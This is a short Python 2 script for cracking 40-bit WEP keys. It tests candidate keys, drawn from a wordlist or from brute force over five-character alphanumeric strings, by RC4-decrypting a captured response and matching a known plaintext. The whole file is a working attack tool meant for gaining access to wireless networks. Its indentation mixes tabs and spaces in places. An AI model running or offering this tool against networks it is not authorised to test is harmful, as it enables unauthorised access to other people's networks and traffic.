#!/usr/bin/python
# -*- coding: utf-8 -*-

import sys
from optparse import OptionParser
from Crypto.Cipher import ARC4
import string
from itertools import product

def testCandidate(iv, key, response):
    rc4 = ARC4.new(iv + key)
    r = rc4.decrypt(response[:5])
    if r == '0100030000'.decode('hex'):
        return True
    return False

def fb_generator(length=1, maxlength=-1, charset=string.ascii_lowercase):
    while length <= maxlength or maxlength < 0:
        k = product(charset, repeat=length)
        for c in k:
            yield ''.join(c)
        length += 1

if __name__ == '__main__':
    parser = OptionParser()
    parser.add_option('', '--iv', dest='iv')
    parser.add_option('', '--response', dest='response')
    parser.add_option('', '--wordlist', dest='wordlist')

    (opts, args) = parser.parse_args(sys.argv)
    if not opts.iv or not opts.response:
        print 'All parameters are required'
        print opts
        sys.exit()

    iv = opts.iv.decode('hex')
    response = opts.response.decode('hex')

    # 40-bit WEP key / wordlist
    if opts.wordlist:
        print 'Wordlist attack...'
      	wordlist = open(opts.wordlist, 'r')
        for w in wordlist:
            w = w.rstrip()
            if len(w) == 5 and testCandidate(iv, w, response):
                print 'Key found: %s' % w
                break
                
    # 40-bit WEP key / brute-force printable chars
    else:
        print 'Brute-force attack...'
	for w in fb_generator(length=5, maxlength=5, charset=string.ascii_lowercase+string.ascii_uppercase+string.digits):
        	if testCandidate(iv, w, response):
            		print 'Key found: %s' % w
	            	break
